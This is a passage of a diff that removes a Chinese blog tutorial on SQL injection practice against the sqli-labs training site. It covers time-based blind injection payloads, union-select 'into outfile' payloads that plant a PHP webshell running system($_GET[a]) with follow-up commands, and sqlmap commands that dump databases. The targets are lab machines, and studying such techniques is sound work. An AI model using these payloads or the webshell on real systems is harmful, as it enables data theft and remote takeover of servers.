src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337171574-3d6cb69a-a4ab-47d4-aa8e-f3547d33ceb7.png" alt="image.png"><br>直接换成昨天写好的布尔盲注的脚本，url换成该题目的api。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337382530-be78a147-5d62-48be-a0cb-ccbd2cd10e4b.png" alt="image.png"><br>因为输入id&#x3D;1结果会出现admin，在if这里可以输入admin。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337442770-1dde82ed-40c6-44ae-9677-2d8ce28663ef.png" alt="image.png"><br>输出结果正常<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337567904-eba06dea-13a2-489e-9a61-e1749d43c882.png" alt="image.png"><br>之后就去各个去爆就好了，爆表，爆字段这些：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703337803267-9b63546b-3658-48aa-9189-de4fa15c67e0.png" alt="image.png"><br>flag结果展示：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703338043250-a585c80f-9ef0-4f5d-b165-c6f8edee5062.png" alt="image.png"><br>运行与调试<br>可以查看到每一步代码的运行过程。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703338331066-1cf077e6-d634-4d18-9d68-0cb9891fb38e.png" alt="image.png"></p>
-<h2 id="时间盲注-睡眠盲注"><a href="#时间盲注-睡眠盲注" class="headerlink" title="时间盲注(睡眠盲注)"></a>时间盲注(睡眠盲注)</h2><p>发现不管输入什么都是直接显示。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703339284198-ed4ba48a-3d65-4cbe-b0cc-392fe6b84ccb.png" alt="image.png"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- -#三元运算，第一个表示条件，第二个1表示成功的时候，sleep(5)表示失败就休息</span></span><br><span class="line"><span class="string">SELECT BENCHMARK(1000000, SHA1(&#x27;</span>Hello World<span class="string">&#x27;));</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">If</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="number">1</span>,<span class="title function_ invoke__">BENCHMARK</span>(<span class="number">5000000</span>, <span class="title function_ invoke__">SHA1</span>(<span class="string">&#x27;Hello World&#x27;</span>)))-- -</span><br></pre></td></tr></table></figure>
-
-<p>可以看到当&#x3D;115时马上就显示<br><img src="https://cdn.nlark.com/yuque/0/2023/png/40666686/1703340391273-4889aeb1-96ad-4d10-9579-56a30ca842e4.png#averageHue=%23a06535&clientId=uf5688ffd-8341-4&from=paste&height=767&id=udd28eeed&originHeight=1055&originWidth=1597&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=356293&status=done&style=none&taskId=u85575a95-70c1-4222-92a3-dad2d477a98&title=&width=1161.4545454545455" alt="image.png"><br>可以看到当&#x3D;114时一直处于加载状态，之后才出现结果。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340416426-3ea97461-54a6-4dad-82e8-d0a528eab24d.png" alt="image.png"><br>直接用时间盲注的脚本。<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703340795579-30954cd2-23f9-4ad7-9ee5-b0955881ea07.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703340795579-30954cd2-23f9-4ad7-9ee5-b0955881ea07.py%22,%22name%22:%22%E6%97%B6%E5%BB%B6%E7%9B%B2%E6%B3%A81.py%22,%22size%22:2046,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u208a619b-6db5-499f-8692-33414b57f10%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ua29a5379%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">时延盲注1.py</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340700798-738fe349-b140-4e16-9e99-2117bbd7f5e8.png" alt="image.png"></p>
-<h2 id="控制网站"><a href="#控制网站" class="headerlink" title="控制网站"></a>控制网站</h2><p>?id&#x3D;-1’ union select 1,@@datadir,3– -显示phpstudy的网站根目录。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703341500246-d1f888c3-d9b8-4a76-a49c-8aaea7c9629b.png" alt="image.png"><br>secure_file_priv&#x3D;””将这段代码放入my.ini的[client]的上一行。这个文本的位置在phpstudy的设置中，点击配置文件，mysql.ini。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703341693015-72840272-40f7-411c-abc7-5b0f52356f5f.png" alt="image.png"><br>之后输入这段代码：<br>?id&#x3D;-1’ union select 1,@@datadir,@@secure_file_priv – -，password这里显示为空说明可以注入，在没有这个secure_file_priv&#x3D;””时password显示的是NULL。NULL代表不能在任何地方注入文件。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703341872977-3d8d342a-bbf5-45a7-88e8-75fc610e8aae.png" alt="image.png"><br>?id&#x3D;-1’ union select 1,@@datadir,”<?php ,phpinfo()  ?>“ into outfile “C:\phpstudy_pro\WWW\phpinfo.php” – -<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343490023-5a004dbb-1deb-4a6f-8bae-3be68f12774a.png" alt="image.png"><br>此时在www的根目录下产生了phpinfo.php。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703342429374-71359c2d-3daf-45e6-b70a-dcc96aff40e3.png" alt="image.png"><br>?id&#x3D;-1’ union select 1,@@datadir,”<?php @system($_GET[a]);  ?>“ into outfile “C:\phpstudy_pro\WWW\tfk.php” – -#在windows中用&#x2F;&#x2F;表示&#x2F;。第一个&#x2F;表示转义符，两个&#x2F;才能表示本身的含义。system表示系统命令执行函数，这个函数通过get参数进行执行，创造了一个webshell后台。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703342328099-4e9cee26-7456-432c-9893-cfb08f1cc290.png"><br>打开网站输入?a&#x3D;dir<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343632508-e42536c9-b428-4a38-8f7d-85936e9eefbf.png" alt="image.png"><br>打开网站输入?a&#x3D;whoami<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343789595-202e1326-e6fd-48e4-b0fb-3ba356e65b71.png" alt="image.png"><br>打开网站输入?a&#x3D;systeminfo输出系统的基本信息<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343915907-1d88aa82-691c-4cb1-b29e-86221a30ffcd.png" alt="image.png"></p>
-<h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><h2 id="sqlmap的使用-1"><a href="#sqlmap的使用-1" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1.下载sqlmap的压缩包，附件如下<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1703343149028-fd98a004-40af-43ea-8d01-d839d12e226e.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1703343149028-fd98a004-40af-43ea-8d01-d839d12e226e.zip%22,%22name%22:%22sqlmap-1.7.zip%22,%22size%22:7517702,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u7f82c97a-84fe-4940-8dea-2928843d8c0%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22id%22:%22ua927c838%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">sqlmap-1.7.zip</a><br>2.在解压缩后的sqlmap文件夹的路径下输入cmd,进入命令行模式。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703343789845-e2bc6636-8695-4887-828a-48edecba3c0e.png" alt="image.png"><br>3.输入<code>sqlmap -h</code>可以查看sqlmap的帮助信息和参数列表，以便正确使用该工具执行各种SQL注入测试和攻击。<br>4.因为主机上执行sqlmap命令时产生了奇怪的报错，转用虚拟机。以sqli的第一关为例，保证虚拟机win10hei和kali都是桥接模式，保证他俩的IP地址在同一网段。在kali的命令行输入爆库命令<code> sqlmap  -u &quot;[http://192.168.2.118/sqli/Less-1/?id=1&quot;](http://192.168.2.70/sqli/Less-1/?id=1&quot;) --dbs</code>，得到库名。注意192.168.2.118是win10hei的IP地址。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703345566426-f9bc4e34-2be5-4552-aeb8-915d7a55f9ee.png" alt="image.png"><br>5.输入爆表命令：<code>sqlmap  -u &quot;[http://192.168.2.118/sqli/Less-1/?id=1&quot;](http://192.168.2.70/sqli/Less-1/?id=1&quot;)  --batch -D security --tables</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703345836431-388137f0-bf58-4684-a28a-c2309816ae94.png" alt="image.png"><br>6.输入爆字段名命令<code>sqlmap  -u &quot;[http://192.168.2.118/sqli/Less-1/?id=1&quot;](http://192.168.2.70/sqli/Less-1/?id=1&quot;)   --batch -D security -T users --columns</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703345978463-5dfb765f-f135-4f62-83b6-b35e90a638a6.png" alt="image.png"><br>7.输入爆字段命令<code>sqlmap  -u &quot;[http://192.168.2.118/sqli/Less-1/?id=1&quot;](http://192.168.2.70/sqli/Less-1/?id=1&quot;)    --batch -D security -T users -C &quot;id,username&quot; --dump</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703346083484-54bf6d01-2b2a-400e-a58f-27c6a05420e1.png" alt="image.png">post请求：<br>以第11关为例：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703347187990-4fe88393-9217-424c-abd5-b8ca5c7f75b0.png" alt="image.png"><br>打开yakit免配置启动。<br>输入虚拟机的ip地址进入第11关。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703347331454-18708817-f96b-46b7-a1dc-8de87609a6bd.png" alt="image.png"><br>用yakit进行抓包发送到web fuzzer<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703347434256-fc9fa70d-f5c5-4769-9c49-bc780f5c420a.png" alt="image.png"><br>将1.txt保存下来存在sqlmap的上一级目录中<br>输入命令：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch</span><br><span class="line">增加等级与风险：  python sqlmap.py -r <span class="string">&quot;../1.txt&quot;</span>  --dbs --batch --level=<span class="number">5</span> --risk=<span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-<p>此时爆出数据库。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703348000344-f1b633df-d235-48ea-aa19-c5b37be8ef63.png" alt="image.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 </div>
